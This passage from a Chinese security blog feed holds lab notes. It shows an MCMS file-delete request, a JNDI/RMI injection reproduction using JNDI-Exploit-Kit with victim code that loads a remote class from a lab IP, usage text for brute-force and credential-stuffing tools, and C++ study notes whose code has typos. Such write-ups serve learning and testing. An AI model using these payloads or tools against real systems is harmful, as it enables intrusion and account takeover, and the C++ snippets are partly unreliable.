<h3 id="Authorized-file-delete"><a href="#Authorized-file-delete" class="headerlink" title="Authorized file delete"></a>Authorized file delete</h3><p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640675200781-2021-12-2815:06:40.png"></p>
<p><code>net/mingsoft/basic/action/TemplateAction.java</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640668607171-2021-12-2813:16:47.png"></p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /ms/template/unZip.do?fileUrl=HACKED HTTP/1.1</span><br><span class="line">Host: 192.168.100.103:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://192.168.100.103:8080/ms/template/index.do?</span><br><span class="line">Cookie: JSESSIONID=56EC9CCC14E1E8DEE4AACCF732EA7FC7; pageno_cookie=1</span><br></pre></td></tr></table></figure>



<h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
  </entry>
  <entry>
    <title>RMI,LDAP jndi注入</title>
    <url>/2021/12/31/RMI-LDAP-jndi%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>之前一直不理解这个jndi到底是啥，一堆java的协议看得很糊涂不知啥用，今天仔细来看看结合工具利用jndi注入</p>
<span id="more"></span>

<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>这个之前接触过，就是一个java　jvm的rpc实现，可以进行远程调用，这里补个图，网图随便找的</p>
<p><img src="https://upload-images.jianshu.io/upload_images/12696746-07f8e95ec97df9dd.png?imageMogr2/auto-orient/strip"></p>
<p>这个client调用的结构在调试代码找jndi工具利用之后源码中的sink点的时候很有帮助</p>
<h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><p>维基百科的解释</p>
<blockquote>
<p>轻型目录访问协议是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。 目录服务在开发内部网和与互联网程序共享用户、系统、网络、服务和应用的过程中占据了重要地位。例如，目录服务可能提供了组织有序的记录集合，通常有层级结构，例如公司电子邮件目录。</p>
</blockquote>
<p>简单理解它就是一个为了目录数据库协议，主要就是为了方便查询，浏览，搜索。</p>
<p>但是在利用方式上和rmi一样，通过利用工具可以很方便的起rmi和ladp服务。</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>首先需要一些工具</p>
<ul>
<li><p>jndi利用工具</p>
<p>这个其实是修改版，加了一些bypass的选项</p>
<p><a href="https://github.com/pimps/JNDI-Exploit-Kit">https://github.com/pimps/JNDI-Exploit-Kit</a></p>
<p>原版是改项目的fork仓库</p>
<p>直接下他的jar包就好，我懒得maven编译一遍</p>
</li>
<li><p>服务端</p>
<p>jndi利用工具的作用就是让我们不用自己手动用代码搭建rmi服务端/ ladp服务端和http服务器了</p>
<p>它会在本机起http服务和rmi服务和ladp服务，根据你的命令构造恶意的类编译过字节码。</p>
<p>直接使用</p>
<p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C gnome-calculator</code></p>
<p>-C 是填写需要命令，具体的命令参数在github有</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640938374674-2021-12-3116:12:54.png"></p>
</li>
<li><p>客户端(受害者)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jndiTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//　我的jdk版本是1.8.0_171，所以需要加这个信任codeBase</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        InitialContext ctx =  <span class="keyword">new</span> InitialContext();</span><br><span class="line">        Object obj =  ctx.lookup(<span class="string">&quot;rmi://192.168.100.103:1099/0uvgtw&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到lookup这里是source点，这里引入了不安全远程调用，<strong>这里也可以看到漏洞利用的条件需要lookup的参数可控</strong></p>
<p>另一个利用的限制就是，关于jdk的版本，这里贴一个师傅做的版本信息图，我一开始jdk版本<code>1.8.0_282</code>是没法触发这个漏洞的</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g89d6g04jvj317r0h70ua.jpg"></p>
</li>
</ul>
<p>​        运行代码弹出计算器，复现成功</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640938978933-2021-12-3116:22:58.png"></p>
<h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>根据师傅的步骤走一下，我源码阅读还是太菜了</p>
<p>调用的堆栈</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640939081645-2021-12-3116:24:41.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640939440780-2021-12-3116:30:40.png"></p>
<p>进入RegisterContext函数</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640939672951-2021-12-3116:34:32.png"></p>
<p>返回来之后return,继续step over，到var3的lookup处进入</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640939911719-2021-12-3116:38:31.png"></p>
<p>一路step over然后找到decodeObject进入</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640940220047-2021-12-3116:43:40.png"></p>
<p>跟进一路step over,直到getObjectInstance进入</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640940540128-2021-12-3116:49:00.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640940728580-2021-12-3116:52:08.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640940862284-2021-12-3116:54:22.png"></p>
<p>执行载入类，到这里就完成了代码的执行</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640940909586-2021-12-3116:55:09.png"></p>
<p>这里我有个疑惑就是为什么loadclass之后恶意的代码就自动执行了</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6633#toc-5">https://xz.aliyun.com/t/6633#toc-5</a></p>
<p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Web扫描器-子域扫描</title>
    <url>/2021/11/16/Web%E6%89%AB%E6%8F%8F%E5%99%A8-%E5%AD%90%E5%9F%9F%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h2 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h2><p>之前也整理过几个子域扫描的插件或者是命令行的形式，都没有这个好用，记录一下这个工具</p>
<span id="more"></span>

<p>这个参数没有其他那么繁多，加之输出会自动整理成csv格式文件，易用性很高</p>
<p>用法：</p>
<p><code>python3 oneforall.py --target xxx.com run</code></p>
<p>贴个运行截图</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637037690180-2021-11-1612:41:30.png"></p>
<h2 id="fuzzdict"><a href="#fuzzdict" class="headerlink" title="fuzzdict"></a><a href="https://github.com/TheKingOfDuck/fuzzDicts">fuzzdict</a></h2><p>用来找字典常用的字典</p>
<h2 id="弱口令检查工具"><a href="#弱口令检查工具" class="headerlink" title="弱口令检查工具"></a><a href="https://github.com/shack2/SNETCracker/releases/tag/1.0.20190715">弱口令检查工具</a></h2><p>windows平台工具，上一个字典结合使用。</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637042739317-2021-11-1614:05:39.png"></p>
<h2 id="弱口令＋撞库"><a href="#弱口令＋撞库" class="headerlink" title="弱口令＋撞库"></a><a href="https://github.com/lijiejie/htpwdScan">弱口令＋撞库</a></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: htpwdScan.py [options]</span><br><span class="line"></span><br><span class="line">* HTTP weak pass scanner. By LiJieJie *</span><br><span class="line"></span><br><span class="line">Target:</span><br><span class="line">  -u RequestURL         指定破解的URL</span><br><span class="line">                        -u &quot;https://www.test.com/login.php&quot;</span><br><span class="line">  -f RequestFile        从文本文件中，导入HTTP请求</span><br><span class="line">  --https               当从文件导入HTTP请求时，强制使用HTTPS</span><br><span class="line">  --get                 强制使用HTTP GET，默认POST</span><br><span class="line">  --auth  [ ...]        Basic/Digest/NTLM 暴力破解,</span><br><span class="line">                        e.g. --auth users.txt pass.txt</span><br><span class="line">                        e.g. --auth users.txt my_own_func(pass.txt)</span><br><span class="line">  --pass-first          固定密码优先爆破,减小账号被锁定几率</span><br><span class="line"></span><br><span class="line">Dictionary:</span><br><span class="line">  -d Param=DictFile [Param=DictFile ...]</span><br><span class="line">                        为参数设置字典文件, 支持二次处理参数值</span><br><span class="line">                        e.g. -d user=users.dic pass=md5(pass.dic)</span><br><span class="line">                        高级用户可自写python函数处理参数，lib/value_process.py</span><br><span class="line">                        e.g. -d user=users.dic pass=capitalize(pass.dic)</span><br><span class="line"></span><br><span class="line">Detect:</span><br><span class="line">  --no302               302跳转不敏感, 默认敏感，视为破解成功标记</span><br><span class="line">  --fail Fail [Fail ...]</span><br><span class="line">                        破解失败时的正文标记,可以是多个</span><br><span class="line">                        e.g. --fail &quot;user not exist&quot; &quot;password wrong&quot;</span><br><span class="line">  --suc Suc [Suc ...]   破解成功时的正文标记,可以是多个</span><br><span class="line">                        e.g. --suc &quot;welcome,&quot; &quot;logout&quot;</span><br><span class="line">  --header-fail HeaderFail</span><br><span class="line">                        位于HTTP头中的破解失败标记</span><br><span class="line">  --header-success HeaderSuccess</span><br><span class="line">                        位于HTTP头中的破解成功标记</span><br><span class="line">  --retry-txt RetryText</span><br><span class="line">                        当该文本出现时，视为当前请求无效，会再次重试</span><br><span class="line">                        e.g. --retry-txt=&quot;IP blocked&quot;</span><br><span class="line">  --retry-no-txt RetryNoText</span><br><span class="line">                        当该文本没有出现时，视为当前请求无效，会再次重试</span><br><span class="line">                        e.g. --retry-no-txt=&quot;&lt;body&gt;&quot;</span><br><span class="line">  --retry-header RetryHeader</span><br><span class="line">                        当该文本出现在HTTP头时，视为当前请求无效，会再次重试</span><br><span class="line">                        e.g. --retry-header=&quot;Set-Cookie:&quot;</span><br><span class="line">  --retry-no-header RetryNoHeader</span><br><span class="line">                        当该文本没有出现在HTTP头时，视为当前请求无效，会再次重试</span><br><span class="line">                        e.g. --retry-no-header=&quot;HTTP/1.1 200 OK&quot;</span><br><span class="line"></span><br><span class="line">Proxy and Spoof:</span><br><span class="line">  --proxy Proxy         命令行设定若干代理服务器</span><br><span class="line">                        e.g. --proxy=1.2.3.4:8000, 5.6.7.8:8000</span><br><span class="line">  --proxy-file ProxyFile</span><br><span class="line">                        通过文件导入若干代理服务器</span><br><span class="line">                        e.g. --proxy-file=proxies.txt</span><br><span class="line">  --check-proxy         校验HTTP代理服务器是否工作正常</span><br><span class="line">  --fake-ip             伪造HTTP头 X-Forwarded-For，尝试伪造源IP</span><br><span class="line">  --fake-sid FakeSID    伪造session ID</span><br><span class="line">  --sleep Seconds       请求完成后延时N秒，减小被服务器封禁IP的几率</span><br><span class="line"></span><br><span class="line">Database attack:</span><br><span class="line">  --database param1,parma2=file</span><br><span class="line">                        导入社工库进行撞库测试</span><br><span class="line">                        e.g. --database user,pass=csdn.txt</span><br><span class="line">  --regex REGEX         按行正则提取参数值. e.g. --regex=&quot;(\S+)\s+(\S+)&quot;</span><br><span class="line"></span><br><span class="line">General:</span><br><span class="line">  -t Threads            并发工作线程，默认50</span><br><span class="line">  --allow-redirect      允许Follow 30x调整，默认禁止</span><br><span class="line">  -o OutFile            输出文件名。 默认为： _proxy.servers.txt 或 _cracked.accounts.txt</span><br><span class="line">  --debug               进入调试模式，观察程序行为</span><br><span class="line">  --silent              减少程序输出，只输出破解成功的条目</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>扫描器</tag>
        <tag>子域扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>C++语法笔记</title>
    <url>/2021/11/06/c++%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<h1 id="c-面向对象"><a href="#c-面向对象" class="headerlink" title="c++面向对象"></a>c++面向对象</h1><p>面向对象程序的四个特点：封装、继承、多态、抽象</p>
<p>对象的两个要素：<strong>属性</strong>和<strong>行为</strong></p>
<p>类是对象的<strong>抽象</strong>，对象是类的<strong>实例</strong></p>
<p><em>多态性</em>   是指：由继承而产生的不同的<strong>派生类</strong>，其对对象的<strong>同一消息</strong>会做出<strong>不同的响应</strong></p>
<p><em>转换构造函数</em>  的作用是将一个<strong>其它类型</strong>的数据转换成一个<strong>类的对象</strong></p>
<p><em>类型转换函数</em>  的作用是将一个<strong>类的对象</strong>转换成<strong>另一类型的数据</strong>，在函数名面前不能指定<strong>函数类型</strong>，函数没有<strong>参数</strong></p>
<p><em>虚基类</em>   在继承<strong>间接共同基类</strong>时只保留一份成员，虚基类不是声明基类时声明的，而是在声明派生类时，指定继承方式时声明的</p>
<span id="more"></span>

<h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><h4 id="静态成员"><a href="#静态成员" class="headerlink" title="静态成员"></a>静态成员</h4><p><em><strong>目的： 突破不同类对象中的数据共享，类似全局变量</strong></em> </p>
<ul>
<li><p>静态数据成员</p>
<ul>
<li>关键字<code>static</code>加在数据类型之前</li>
<li>只能在 <em>类外</em>  以<code>数据类型 类名 :: 静态成员函数名 =  初值</code>的形式进行初始化</li>
<li><code>static</code> 数据成员不可以做成构造函数</li>
</ul>
</li>
<li><p>静态成员函数</p>
<ul>
<li><p>主要用来访问静态成员函数，(如下例)访问非静态成员时用“.”运算符</p>
</li>
<li><p>没有this指针，若要使用对象成员必须写入参数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">Test</span> <span class="params">(ObjName&amp; Object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Object.ObjMember;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h4><ol>
<li>类外普通函数 作为  友元函数<ul>
<li>在类内声明类外函数是友元函数，声明前加<code>friend</code></li>
<li>实现在类外调用类内private类型的数据成员</li>
</ul>
</li>
<li>（另一个类的）成员函数 作为  友元函数<ul>
<li>在一个类的成员函数中声明另一个类成员函数为友元</li>
<li>有时需要提前声明类，<code>class ClassName;</code></li>
</ul>
</li>
</ol>
<h4 id="常对象-const-和常引用"><a href="#常对象-const-和常引用" class="headerlink" title="*常对象(const)和常引用"></a>*常对象(const)和常引用</h4><ol>
<li><p>常数据成员</p>
<p><code>const int test;</code>即定义了一个int类型的数据成员</p>
<ul>
<li>构造函数只能用初始</li>
<li>化列表对常成员函数进行初始化</li>
</ul>
</li>
<li><p>常成员函数</p>
<p> 在成员函数的结尾加上一个<code>const</code></p>
<ul>
<li><p>可以调用常数据成员，常对象 和 普通数据成员</p>
</li>
<li><p>不能改变任何一个被调用数据的值</p>
</li>
</ul>
</li>
<li><p>常对象和常指针</p>
<ul>
<li><code>类名 * const 指针名</code>指针指向的对象不能改变，但对象值可以改变</li>
<li><code>const 类名  * 指针名</code>指针指向的对象可以改变（也可以指向非const类），但对象值不能改变</li>
<li>如果一个变量被声明成了常变量，只能用const在前的那一种指针</li>
</ul>
</li>
<li><p>对象的常应引用</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  对象的引用</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">Time</span>(<span class="keyword">int</span> h,<span class="keyword">int</span> m,<span class="keyword">int</span> s):<span class="built_in">hour</span>(h),<span class="built_in">minute</span>(m),<span class="built_in">sec</span>(s)&#123;&#125;</span><br><span class="line">    	<span class="keyword">int</span> hour;</span><br><span class="line">    	<span class="keyword">int</span> minute;</span><br><span class="line">    	<span class="keyword">int</span> sec;</span><br><span class="line">&#125;;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(time &amp;t)</span></span></span><br><span class="line"><span class="function">    </span>&#123;t.hour = <span class="number">18</span>;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>   </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="function">Time <span class="title">t1</span><span class="params">(<span class="number">10</span>,<span class="number">13</span>,<span class="number">56</span>)</span></span>;</span><br><span class="line">        <span class="built_in">fun</span> (t1);</span><br><span class="line">        cout &lt;&lt; t1.hour &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>不想改变t1的值可以用<code>void fun(const Time &amp; t)</code></li>
</ul>
<h4 id="重载运算符"><a href="#重载运算符" class="headerlink" title="重载运算符"></a>重载运算符</h4><p>重载运算符格式(只能作为成员函数)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">函数类型 <span class="keyword">operator</span> 运算符名称（形参表）</span><br><span class="line">&#123;</span><br><span class="line">	运算符的重载处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不能重载的运算符只有五个”.”*”::”sizeof””?:”</p>
<p>重载流运算符</p>
<ul>
<li><p>只能将流运算符作为友元</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//写在类外，并且在类中的public作为友元函数</span></span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt;(ostream &amp; output ,Complex &amp; c)<span class="comment">//引用只是个别名</span></span><br><span class="line">&#123;</span><br><span class="line">    output &lt;&lt;  c.real &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; c.imag&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>类型转换函数</p>
<ul>
<li>只能作为成员函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">operator</span> 类型名()</span><br><span class="line">&#123;实现转换的语句&#125;</span><br></pre></td></tr></table></figure>

<p>example：</p>
<p>一个整数和一个复数直接相加，设已有复数类Complex,类中有private有real和imag两个数据成员表示实部和虚部</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//写在类Complex中的public作为成员函数</span></span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">return</span> real;&#125;</span><br></pre></td></tr></table></figure>

<p>这样主函数就可以实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Complex d,d1;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">2</span>;</span><br><span class="line">    d1 = d + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="构造函数和析构函数"><a href="#构造函数和析构函数" class="headerlink" title="构造函数和析构函数"></a>构造函数和析构函数</h4><pre><code> 1. 用构造函数实现数据成员的初始化
</code></pre>
<ul>
<li><p>构造函数没有返回值类型，函数名和类名相同</p>
</li>
<li><p>构造函数可以重载，既可以使用不同的函数参数进行对象的初始化</p>
</li>
<li><p>构造函数由编译器自动调用语句，用于对象数据成员的初始化（不需要也不能手动调用）</p>
</li>
</ul>
<hr>
<ol start="2">
<li>默认构造函数</li>
</ol>
<ul>
<li>使用默认构造函数的时候使用 <code>Classname obj</code></li>
</ul>
<hr>
<ol start="3">
<li> 构造函数参数表，类外定义</li>
</ol>
<ul>
<li>使用参数表定义构造函数 </li>
<li>用参数表对数据成员进行初始化</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Box</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">		<span class="built_in">Box</span> (<span class="keyword">int</span> h,<span class="keyword">int</span> w,<span class="keyword">int</span> l):<span class="built_in">height</span> (h),<span class="built_in">weight</span> (w),<span class="built_in">len</span> (l)&#123;&#125;<span class="comment">//用参数表对数据成员进行初始化</span></span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="keyword">int</span> height ;</span><br><span class="line">		<span class="keyword">int</span> weight ;</span><br><span class="line">		<span class="keyword">int</span> len;</span><br><span class="line">&#125; ;<span class="comment">//分号记得加	</span></span><br></pre></td></tr></table></figure>

<ul>
<li>可以有多个构造函数，构造函数允许缺省</li>
</ul>
<hr>
<ol start="4">
<li>析构函数</li>
</ol>
<ul>
<li>析构函数在类名前加一个<code>~</code></li>
<li> 在类里面只能定义一个析构函数</li>
<li> 没有参数</li>
</ul>
<p>例如<code>~ box( )； </code>定义在公有类中，析构函数在对象生命周期结束时自动调用，释放内存空间</p>
<h2 id="继承与派生"><a href="#继承与派生" class="headerlink" title="继承与派生"></a>继承与派生</h2><ul>
<li><p>继承：为了提高程序的可重用性。在一个类的基础上建立一个新的类。被继承的类被称为基类（base class）,新建立的类称为派生类（derived class） </p>
</li>
<li><p>one base class —&gt; one derived class 单继承（single inheritance）;</p>
</li>
<li><p>one base class —&gt; some derived class多重继承（multiple inheritance）；</p>
</li>
<li><p>形式  </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 派生类名 :</span>[继承方式] 基类名</span><br><span class="line">&#123;</span><br><span class="line">	派生类新增成员</span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure>

<p>继承方式：public , private , protected .</p>
</li>
<li><p>基类成员在派生类中的访问属性</p>
<table>
<thead>
<tr>
<th>在基类中的访问属性</th>
<th>继承方式</th>
<th>在派生类中的访问属性</th>
</tr>
</thead>
<tbody><tr>
<td>private</td>
<td>private/public/protected</td>
<td>均不可访问</td>
</tr>
<tr>
<td>public</td>
<td>private/public/protected</td>
<td>private/public /protected(取权限小)</td>
</tr>
<tr>
<td>protected</td>
<td>public</td>
<td>protected（取权限小）</td>
</tr>
<tr>
<td>protected</td>
<td>private</td>
<td>private（取权限小）</td>
</tr>
<tr>
<td>protected</td>
<td>protected</td>
<td>protected（取权限小）</td>
</tr>
</tbody></table>
</li>
<li><p>派生类的构成</p>
<ol>
<li>从基类接受成员（全部成员，不包括析构和构造）</li>
<li>调整从基类接受的成员（调整访问属性）</li>
<li>声明派生类的增加成员</li>
</ol>
</li>
<li><p>四种访问属性</p>
<ol>
<li><code>public</code>类内类外都可以访问</li>
<li><code>private</code>类内可以访问类外不可以</li>
<li><code>protected</code>同private，且在下一层的派生中可以访问</li>
<li><code>不可访问</code> 类内类外都不可访问</li>
</ol>
</li>
<li><p>派生类的构造函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">派生类的构造函数名（总参数表）: 基类构造函数名（参数表）<span class="comment">//函数调用，实参</span></span><br><span class="line">&#123;派生类中新增的数据成员初始化语句&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>含有子对象的构造函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">派生类的构造函数名（总参数表）: 基类构造函数名（参数表）,子对象（参数表）<span class="comment">//函数调用，实参</span></span><br><span class="line">&#123;派生类中新增的数据成员初始化语句&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>多级派生构造函数</p>
</li>
</ul>
<p>多级派生构造函数只需调用直接基类即可。</p>
<ul>
<li><p>多重继承</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">派生类的构造函数名（总参数表）: 基类<span class="number">1</span>构造函数名（参数表）,基类<span class="number">2</span>构造函数名(参数表)...</span><br><span class="line">    <span class="comment">//函数调用，实参</span></span><br><span class="line">&#123;派生类中新增的数据成员初始化语句&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>多重继承的二义性</li>
</ul>
<ol>
<li>两个基类有同名成员（用<code>类名+作用域拓展符(::)</code>解决）</li>
<li>两个基类和派生类三者都有同名成员（同名覆盖，仅派生类中的起作用）</li>
<li>class A，class B是同一个基类派生（虚基类）</li>
</ol>
</li>
<li><p>虚基类的初始化（构造函数） </p>
<p>间接派生类在构造函数中也要写出？</p>
</li>
<li><p>基类和派生类的转换</p>
<ol>
<li>派生类对象可以给基类对象赋值</li>
<li>派生类对象可以替代基类对象向基类对象进行赋值或者初始化</li>
</ol>
</li>
</ul>
<h3 id="虚基类-解决多重继承二义性问题"><a href="#虚基类-解决多重继承二义性问题" class="headerlink" title="虚基类(解决多重继承二义性问题)"></a>虚基类(解决多重继承二义性问题)</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  </span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">virtual</span> A</span><br><span class="line">&#123;</span><br><span class="line">  	  </span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span><span class="keyword">virtual</span> A</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在派生的类中加入上一个类的虚基类继承（virtual），则仅需要在派生类中添加自己的数据成员； </p>
<h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><p><em><strong>多态性</strong></em>   </p>
<ol>
<li><p>静态多态由函数重载来实现</p>
</li>
<li><p>虚函数的作用：可以输出基类和派生类中的内容不同的同名函数。（动态多态）</p>
</li>
</ol>
<p>example：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">    	<span class="keyword">int</span> num;</span><br><span class="line">    	string name;</span><br><span class="line">    	<span class="keyword">float</span> score;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">student</span> (<span class="keyword">int</span> n,string na,<span class="keyword">float</span> s):<span class="built_in">num</span>(n),<span class="built_in">name</span>(na),<span class="built_in">score</span>(s)&#123;&#125;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            cout &lt;&lt; num&lt;&lt;name&lt;&lt;score；</span><br><span class="line">        &#125; </span><br><span class="line">&#125;；</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">graduate</span> :</span><span class="keyword">public</span> stduent</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="keyword">int</span> wage;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="built_in">graduate</span> (<span class="keyword">int</span> n,stirng na,<span class="keyword">float</span> s,<span class="keyword">int</span> w):<span class="built_in">student</span>(n,na,s),<span class="built_in">wage</span>(w)&#123;&#125;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> <span class="comment">//virtual void display() </span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        cout &lt;&lt; num&lt;&lt;name&lt;&lt;score&lt;&lt;wage;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//student obj define</span></span><br><span class="line">    <span class="comment">//graduate obj define</span></span><br><span class="line">    student *pt = &amp;student obj;</span><br><span class="line">    pt-&gt;<span class="built_in">display</span>();</span><br><span class="line">    pt = &amp; granduate obj;</span><br><span class="line">    pt -&gt;<span class="built_in">dispaly</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	如果不将上一处的注释处改成注释内容；</span></span><br><span class="line"><span class="comment">	两个display（）均只能输出“name”“score”“num”三个信息</span></span><br><span class="line"><span class="comment">	若加上改成注释内容；</span></span><br><span class="line"><span class="comment">	main函数中的第一个display（）输出三个信息</span></span><br><span class="line"><span class="comment">	